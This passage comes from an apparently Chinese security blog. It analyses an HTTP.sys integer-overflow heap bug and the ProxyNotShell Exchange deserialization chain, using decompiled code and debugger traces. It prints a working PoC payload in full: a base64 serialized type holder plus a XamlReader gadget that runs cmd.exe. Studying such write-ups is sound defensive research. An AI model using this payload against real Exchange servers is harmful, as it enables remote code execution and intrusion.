*)(v22 + 8i64 * v26) = v32 + (unsigned int)(v24 - v31); v27 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v26); if ( *(_DWORD *)v27 == 2 ) { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 2; *(_QWORD *)(v24 + 8) = v32 + (unsigned int)((_DWORD)v25 - v31); *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v25, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16)); v25 = \u0026amp;v35[*(unsigned int *)(v27 + 16)]; } else { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 1; v28 = (char *)((unsigned __int64)(v25 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); *(_QWORD *)(v24 + 8) = v32 + (((_DWORD)v25 + 1) \u0026amp; 0xFFFFFFFE) - (unsigned int)v31; *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v28, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16));// 触发漏洞 v25 = \u0026amp;v28[*(unsigned int *)(v27 + 16)]; } v35 = v25; v34 = ++v26; v24 = (__int64)v36; v22 = v39; } goto LABEL_31; } LABEL_32: if ( (int)(OutputBufferForOutDirect + 0x80000000) \u0026lt; 0 || OutputBufferForOutDirect == -2147483643 ) v6 = v8; *v3 = v6; return (unsigned int)OutputBufferForOutDirect; } 在UlpComputeChannelBindConfigSize函数中存在整数溢出，该函数伪代码如下，rsi+10h处指向了用户传入的HTTP_CHANNEL_BIND_INFO结构体，该结构体定义如下：\ntypedef struct _HTTP_CHANNEL_BIND_INFO { HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening; ULONG Flags; PHTTP_SERVICE_BINDING_BASE * ServiceNames; ULONG NumberOfServiceNames; } HTTP_CHANNEL_BIND_INFO, *PHTTP_CHANNEL_BIND_INFO; typedef enum _HTTP_AUTHENTICATION_HARDENING_LEVELS { HttpAuthenticationHardeningLegacy = 0, HttpAuthenticationHardeningMedium, HttpAuthenticationHardeningStrict } HTTP_AUTHENTICATION_HARDENING_LEVELS; typedef struct _HTTP_SERVICE_BINDING_BASE { HTTP_SERVICE_BINDING_TYPE Type; } HTTP_SERVICE_BINDING_BASE, *PHTTP_SERVICE_BINDING_BASE; typedef struct _HTTP_SERVICE_BINDING_A { HTTP_SERVICE_BINDING_BASE Base; PCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_A, *PHTTP_SERVICE_BINDING_A; typedef struct _HTTP_SERVICE_BINDING_W { HTTP_SERVICE_BINDING_BASE Base; PWCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_W, *PHTTP_SERVICE_BINDING_W; __int64 __fastcall UlpComputeChannelBindConfigSize(__int64 a1, IRP *a2) { unsigned int v4; // ebx __int64 v5; // rax __int64 v6; // rdi __int64 v7; // r9 _DWORD *v8; // r8 v4 = IoIs32bitProcess(a2) != 0 ? 16 : 24; if ( (*(_DWORD *)a1 \u0026amp; 1) != 0 ) { v5 = *(_QWORD *)(a1 + 16); if ( v5 ) { if ( *(_DWORD *)(v5 + 16) ) { v6 = 0i64; v4 += (IoIs32bitProcess(a2) != 0 ? 16 : 32) * *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); if ( *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { do { IoIs32bitProcess(a2); v7 = *(_QWORD *)(a1 + 16); // HTTP_CHANNEL_BIND_INFO 结构体 v8 = *(_DWORD **)(*(_QWORD *)(v7 + 8) + 8 * v6);// ServiceName 结构体 if ( *v8 == 1 ) // 如果是HttpServiceBindingTypeW 则进入 v4 = (v4 + 1) \u0026amp; 0xFFFFFFFE; v4 += v8[4]; // V8是enum HTTP_SERVICE_BINDING_BASE类型，占4个字节，则V8[4]就是V8 后面16个字节，即BufferSize v6 = (unsigned int)(v6 + 1); } while ( (unsigned int)v6 \u0026lt; *(_DWORD *)(v7 + 16) ); } } } } return v4; } 该函数遍历HTTP_CHANNEL_BIND_INFO结构体的ServiceNames HTTP_SERVICE_BINDING_W指针数组的BufferSize，并相加，而后将其返回，其中v4为unsigned int类型，而BufferSize为ULONG类型，均为四个字节，当循环相加时，如果BufferSize * NumberOfServiceNames 和v4相加超出0xFFFFFFFF则会产生整数溢出，使得UlpComputeChannelBindConfigSize返回的内存大小小于实际所需的内存大小。在调试器中可以看到在执行完fffff805`7984c899 03d9 add ebx, ecx后，将产生溢出，ebx变为0x28。\n返回到上层函数，UlCopyChannelBindConfigToIrp 调用UxGetOutputBufferForOutDirect获取到用户传入的缓冲区大小，此时v41值为0x140\nretCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (__int64)a2, (__int64)CurrentStackLocation, 0x10u, 4i64, \u0026amp;v31, \u0026amp;v32, \u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } 由于在HTTP!UlpComputeChannelBindConfigSize中发生整数溢出，导致HTTP!UlpComputeChannelBindConfigSize返回值小于用户提供的0x140，绕过了内存大小检查，在后面通过memcpy将HTTP_CHANNEL_BIND_INFO结构体的PHTTP_SERVICE_BINDING_BASE的Buffer成员拷贝到指定内存中，拷贝长度为BufferSize，即用户提供的0xF0F0EF0\n0xF0F0EF0远大于用户输入的缓冲区0x1000，导致堆溢出。\n补丁 通过bindiff可知，在补丁中增加了对BufferSize进行判断的逻辑，判断BufferSize是否小于0xFFFC\n由于ServiceName最大数量限制为0x40，则0x40 * 0xFFFC = 3FFF00，不能产生溢出，修复了该漏洞。\n参考资料\nhttps://www.freebuf.com/vuls/364920.html\nCreated at 2023-05-05T20:59:45+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/","title":"Proxy Not Shell","tags":[],"description":"","content":"漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：\nCVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。\nCVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。\n在PoC中发送了以下三种类型的PSRP消息\n0x00010002 SESSION_CAPABILITY\nSESSION_CAPABILITY 应该是创建RunspacePool\n0x00010004 INIT_RUNSPACEPOOL\nINIT_RUNSPACEPOOL 应该是初始化RunspacePool\n0x00021006 CREATE_PIPELINE\n创建命令管道并在指定的 RunspacePool 中调用它\nPoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。\nPoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象\n\u0026lt;Obj N=\u0026#34;V\u0026#34; RefId=\u0026#34;14\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;Name\u0026#34;\u0026gt;Type\u0026lt;/S\u0026gt; \u0026lt;Obj N=\u0026#34;TargetTypeForDeserialization\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Exception\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;MS\u0026gt; \u0026lt;BA N=\u0026#34;SerializationData\u0026#34;\u0026gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=\u0026lt;/BA\u0026gt; \u0026lt;/MS\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;S\u0026gt; \u0026lt;![CDATA[\u0026lt;ResourceDictionary xmlns=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation\u0026#34; xmlns:x=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml\u0026#34; xmlns:System=\u0026#34;clr-namespace:System;assembly=mscorlib\u0026#34; xmlns:Diag=\u0026#34;clr-namespace:System.Diagnostics;assembly=system\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider x:Key=\u0026#34;LaunchCalch\u0026#34; ObjectType=\u0026#34;{x:Type Diag:Process}\u0026#34; MethodName=\u0026#34;Start\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider.MethodParameters\u0026gt;\u0026lt;System:String\u0026gt;cmd.exe\u0026lt;/System:String\u0026gt;\u0026lt;System:String\u0026gt;/c whoami\u0026gt; c:\\users\\public\\1.txt\u0026lt;/System:String\u0026gt; \u0026lt;/ObjectDataProvider.MethodParameters\u0026gt; \u0026lt;/ObjectDataProvider\u0026gt; \u0026lt;/ResourceDictionary\u0026gt;]]\u0026gt; \u0026lt;/S\u0026gt; \u0026lt;/Obj\u0026gt; XamlReader.Parse() BA标签数据 .....ÿÿÿÿ..............System.UnitySerializationHolder..... Data\tUnityType.AssemblyName......... System.Windows.Markup.XamlReader......... XPresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35. PoC部分由两个对象嵌套而成，大致结构如下所示：\nObj V(System.ServiceProcess.ServiceController): String Name=\u0026#34;Type\u0026#34; Obj TargetTypeForDeserialization(System.Exception): ByteArray SerializationData String SerializationData 代码逻辑\n代码逻辑如下图\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\r\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\r背景 1\rCenter Gradient\r页-1\r流程\rReadOneObject\rReadOneObject\t流程.8\rReadOneDeserializedObject 遍历XML树的标签\rReadOneDeserializedObject遍历XML树的标签\t动态连接线\r调用读取一个反序列化对象 object obj = this.ReadOneDeserializedObject\r调用，读取一个反序列化对象object obj = this.ReadOneDeserializedObject\t动态连接线.12\r碰到Obj标签调用读取一个Obj对象 if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){ return thi...\r碰到Obj标签，调用，读取一个Obj对象if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){return this.ReadPSObject();}\t流程.11\rReadPSObject 读取一个Obj对象\rReadPSObject读取一个Obj对象\t动态连接线.14\r碰到Props标签调用读取Props标签 if (this.IsNextElement(\u0026#34;Props\u0026#34;)){ this.R...\r碰到Props标签，调用，读取Props标签if (this.IsNextElement(\u0026#34;Props\u0026#34;)){this.ReadProperties(psobject);}\t流程.13\rReadProperties\rReadProperties\t动态连接线.16\r调用读取嵌套对象\r调用，读取嵌套对象\t流程.15\rReadOneObject\rReadOneObject\t动态连接线.20\r调用将反序列化数据 转换为目标类型此时目标类型为System.Exception\r调用，将反序列化数据转换为目标类型，此时目标类型为System.Exception\t流程.19\rConvertTo\rConvertTo\t动态连接线.22\r一系列调用\r一系列调用\t流程.21\rObject.Reader.Deserialize\rObject.Reader.Deserialize\t动态连接线.24\r调用解析内存中的序列化数据\r调用，解析内存中的序列化数据\t流程.23\r__BinaryParser.Run\r__BinaryParser.Run\t动态连接线.28\r流程.27\r将序列化数据解析为System.UnitySerializationHolder对象并载入m_assmblyName对应的...\r将序列化数据解析为System.UnitySerializationHolder对象，并载入m_assmblyName对应的DLL\t动态连接线.39\r流程.38\r转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象\r转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象\t动态连接线.41\r一系列返回\r一系列返回\t动态连接线.43\r流程.42\r将ConverTo返回的Type对象加入.adaptedMembers\r将ConverTo返回的Type对象加入.adaptedMembers\t流程.45\rGetTargetTypeForDeserialization\rGetTargetTypeForDeserialization\t流程.53\rReadOneDeserializedObject\rReadOneDeserializedObject\t流程.54\rReadOneObject\rReadOneObject\t动态连接线.56\r动态连接线.57\r动态连接线.58\r动态连接线.59\r调用\r调用\t动态连接线.61\r流程.60\rGetPSStandardMember\rGetPSStandardMember\t动态连接线.63\r流程.62\r读取adaptedMembers的TargetTypeForDeserialization并返回\r读取adaptedMembers的TargetTypeForDeserialization并返回\t动态连接线.66\r调用将外层对象序列化数据\r调用，将外层对象序列化数据\t流程.65\rLanguagePrimitives.ConvertTo\rLanguagePrimitives.ConvertTo\t动态连接线.69\r流程.68\r将S标签内数据转换为XamlReader对象触发代码执行\r将S标签内数据转换为XamlReader对象，触发代码执行\t在Exchange中，允许反序列化的类白名单和类反序列化相关信息定义在exchange.partial.types.ps1xml和exchange.types.ps1xml等文件中，Exchange会读取这些文件，在反序列化数据时，会payload里面的目标类和文件里面的白名单类做对比，只有在白名单内的类才允许反序列化。\nPoC由嵌套对象组成，在反序列化嵌套对象时，会先反序列化里层对象，而后反序列化外层对象。在Exchang反序列化PoC的里层对象时，将通过ConvertTo函数转换到目标类，传给ConvertTo的resultType值为System.Exception，System.Exception在exchange.partial.types.ps1xml中定义如下：\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.Exception\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;CodeProperty IsHidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;SerializationData\u0026lt;/Name\u0026gt; \u0026lt;GetCodeReference\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;MethodName\u0026gt;GetSerializationData\u0026lt;/MethodName\u0026gt; \u0026lt;/GetCodeReference\u0026gt; \u0026lt;/CodeProperty\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;TypeConverter\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;/TypeConverter\u0026gt; \u0026lt;/Type\u0026gt; internal static object ConvertTo(object valueToConvert, Type resultType, bool recursion, IFormatProvider formatProvider, TypeTable backupTypeTable) { object result; using (LanguagePrimitives.typeConversion.TraceScope(\u0026#34;Converting \\\u0026#34;{0}\\\u0026#34; to \\\u0026#34;{1}\\\u0026#34;.\u0026#34;, valueToConvert, resultType)) { if (resultType == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;resultType\u0026#34;); } bool flag; result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, out flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : null, formatProvider, backupTypeTable); } return result; } 其定义了*\u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt;，Exchange将通过Microsoft.Exchange.Data.SerializationTypeConverter*类对里层序列化数据进行反序列化。Microsoft.Exchange.Data.SerializationTypeConverter经过一系列调用，最终由System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize方法进行反序列化。\n在该方法会调用System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Run，这方法会循环读取内存中的里层对象的序列化数据，将其转换为System.UnitySerializationHolder对象。\n之后Exchange会通过Assembly.LoadFrom载入*System.UnitySerializationHolder.m_assemblyName所指明的DLL，并且返回System.UnitySerializationHolder.m_data*类型的Type对象。\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ...... serParser.Run(); ...... if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } 在一系列函数调用返回后，System.Management.Automation.InternalDeserializer.ReadProperties会将System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize返回的对象添加到PSObject.adaptedMembers中，需要注意的是该对象变量名为TargetTypeForDeserialization。\nprivate void ReadProperties(PSObject dso) { dso.isDeserialized = true; dso.adaptedMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod\u0026lt;PSMemberInfo\u0026gt;(dso, \u0026#34;GetType\u0026#34;)); PSGetMemberBinder.SetHasInstanceMember(\u0026#34;GetType\u0026#34;); dso.clrMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); if (this.ReadStartElementAndHandleEmpty(\u0026#34;Props\u0026#34;)) { while (this._reader.NodeType == XmlNodeType.Element) { string name = this.ReadNameAttribute(); object serializedValue = this.ReadOneObject(); PSProperty member = new PSProperty(name, serializedValue); dso.adaptedMembers.Add(member); } this.ReadEndElement(); } } 在反序列化外层对象时，ReadOneObject会调用GetTargetTypeForDeserialization获取反序列化的目标类型，并通过ConvertTo转化为该对象。\n在GetTargetTypeForDeserialization函数中，将会调用GetPSStandardMember并传入硬编码的TargetTypeForDeserialization，在GetPSStandardMember中会通过TypeTableGetMemberDelegate创建成员集合，其中包括子类的成员属性，而后匹配其中的memberName项对应的值并返回。此时获取的值为XamlReader类型的Type对象。\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } internal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } 外层类类型定义为System.ServiceProcess.ServiceController，其定义在types.ps1xml文件内，定义如下。\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;MemberSet\u0026gt; \u0026lt;Name\u0026gt;PSStandardMembers\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;PropertySet\u0026gt; \u0026lt;Name\u0026gt;DefaultDisplayPropertySet\u0026lt;/Name\u0026gt; \u0026lt;ReferencedProperties\u0026gt; \u0026lt;Name\u0026gt;Status\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;DisplayName\u0026lt;/Name\u0026gt; \u0026lt;/ReferencedProperties\u0026gt; \u0026lt;/PropertySet\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/MemberSet\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServiceName\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;RequiredServices\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServicesDependedOn\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;ScriptMethod\u0026gt; \u0026lt;Name\u0026gt;ToString\u0026lt;/Name\u0026gt; \u0026lt;Script\u0026gt; $this.ServiceName \u0026lt;/Script\u0026gt; \u0026lt;/ScriptMethod\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/Type\u0026gt; 在GetPSStandardMember函数会试图获取System.ServiceProcess.ServiceController类的TargetTypeForDeserialization（传入的硬编码参数）属性，但其在文件内没有定义默认的TargetTypeForDeserialization值，所以外层类的members内没有TargetTypeForDeserialization名字的值，Exchange将试图从子类的members属性中检索TargetTypeForDeserialization名字的值，前面说过在对内层对象反序列化时，通过ReadProperties将名为TargetTypeForDeserialization的XamlReader类型的Type对象添加到了adaptedMembers中，此时Exchange将会检索到该对象并返回。\n获取到targetTypeForDeserialization之后，ReadOneObject调用LanguagePrimitives.ConvertTo将序列化数据转换为targetTypeForDeserialization(XamlReader)。\ninternal object ReadOneObject(out string streamName) { .... object obj = this.ReadOneDeserializedObject(out streamName, out flag); ..... Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(this._typeTable); .... object obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, true, CultureInfo.InvariantCulture, this._typeTable); ..... } ConvertTo函数会进行如下调用链，通过反射获取到XamlReader类的Parse方法后，将其调用，成功执行代码。\n调试 使用dnsPy附加到下面的进程\nc:\\windows\\system32\\inetsrv\\w3wp.exe -ap \u0026#34;MSExchangePowerShellAppPool\u0026#34; -v \u0026#34;v4.0\u0026#34; -c \u0026#34;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\u0026#34; -a \\\\.\\pipe\\iisipm319caf0c-5de0-4833-8a04-4b28f4a836ae -h \u0026#34;C:\\inetpub\\temp\\apppools\\MSExchangePowerShellAppPool\\MSExchangePowerShellAppPool.config\u0026#34; -w \u0026#34;\u0026#34; -m 0 在以下几个地方下断点\nSystem.Runtime.Serialization.Formatters.Binary ObjectReader.Deserialize 发送PoC，调试器在断点处断下，此时调用栈如下:\n此时为Exchange试图将Props标签内的序列化数据通过ConvertTo函数转化为System.Exception对象，System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize会通过serParser.Run()解析读入内存中的base64解码数据。\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ..... serParser.Run(); if (this.bFullDeserialization) { this.m_objectManager.DoFixups(); } if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } serParser.Run()会将内存序列化数据试图转化为System.UnitySerializationHolder 对象，代码如下，通过循环读取各个标志位调用不同方法从内存中读取指定类型的数据。构造出System.UnitySerializationHolder对象并载入System.UnitySerializationHolder.AssemblyName对应的DLL。\ninternal void Run() { try { bool flag = true; this.ReadBegin(); this.ReadSerializationHeaderRecord(); while (flag) { BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object; BinaryTypeEnum binaryTypeEnum = this.expectedType; if (binaryTypeEnum != BinaryTypeEnum.Primitive) { if (binaryTypeEnum - BinaryTypeEnum.String \u0026gt; 6) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TypeExpected\u0026#34;)); } byte b = this.dataReader.ReadByte(); binaryHeaderEnum = (BinaryHeaderEnum)b; switch (binaryHeaderEnum) { case BinaryHeaderEnum.Object: this.ReadObject(); break; case BinaryHeaderEnum.ObjectWithMap: ..... this.ReadObjectWithMap(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectWithMapTyped: ...... this.ReadObjectWithMapTyped(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectString: ...... this.ReadObjectString(binaryHeaderEnum); break; case BinaryHea......flag2) { ObjectProgress objectProgress = (ObjectProgress)this.stack.Peek(); if (objectProgress == null) { this.expectedType = BinaryTypeEnum.ObjectUrt; this.expectedTypeInformation = null; flag2 = true; } else { flag2 = objectProgress.GetNext(out objectProgress.expectedType, out objectProgress.expectedTypeInformation); this.expectedType = objectProgress.expectedType; this.expectedTypeInformation = objectProgress.expectedTypeInformation; if (!flag2) { this.prs.Init(); if (objectProgress.memberValueEnum == InternalMemberValueE.Nested) { this.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } else { this.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } this.stack.Pop(); this.PutOp(objectProgress); } } } } } } ...... } 将XamlReader读入内存\n在System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize中将通过\nthis.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); 将System.UnitySerializationHolder转化为Type类型的XamlReader对象，并通过反射获取了XamlReader类的各个属性。\n在最后将this.TopObject作为返回值返回，在经过一系列函数调用返回后，可以在调试器看到ConvertTo函数返回了Object类型对象obj2，可以看到其为类型为Type类型的XamlReader对象，之后ReadOneObject返回该对象。\n注：Type类型是Exchange内定义的抽象类，如下所示：\nnamespace System { // Token: 0x02000148 RID: 328 [ClassInterface(ClassInterfaceType.None)] [ComDefaultInterface(typeof(_Type))] [ComVisible(true)] [__DynamicallyInvokable] [Serializable] public abstract class Type : MemberInfo, _Type, IReflect { // Token: 0x17000217 RID: 535 // (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A public override MemberTypes MemberType { get { return MemberTypes.TypeInfo; } } (应该可以理解obj2为实现了Type这个抽象类的XamlReader对象，而XamlReader继承了Object这个父类，所以可以使用Object类型对象接受)\n在调用栈内，ReadOneObject由ReadProperties调用，回到ReadProperties逻辑中，Exchange会将ReadOneObject返回的的Type类型的XamlReader对象添加到dso.adaptedMembers中，而后这个dso将会返回到调用栈内的ReadOneObject函数。\n继续调试，此时嵌套对象的内层对象已反序列化，开始反序列化外层对象，回到程序中，从下图可以看到，将会调用psobject.GetTargetTypeForDeserialization获取目标反序列化类型，此时psobject内的adaptedMembers内有名为TargetTypeForDeserialization的对象，其类型为Type的XamlReader对象\n进入到psobject.GetTargetTypeForDeserialization内，调用this.GetPSStandardMember试图获取PSMemberInfo 对象，而后将其强转为Type对象返回，若失败则返回null\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } 在GetPSStandardMember函数内，调用PSObject.TypeTableGetMemberDelegate并传入当前对象、允许的类型列表和硬编码PSStandardMembers以初始化PSMemberSet 对象。\ninternal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo 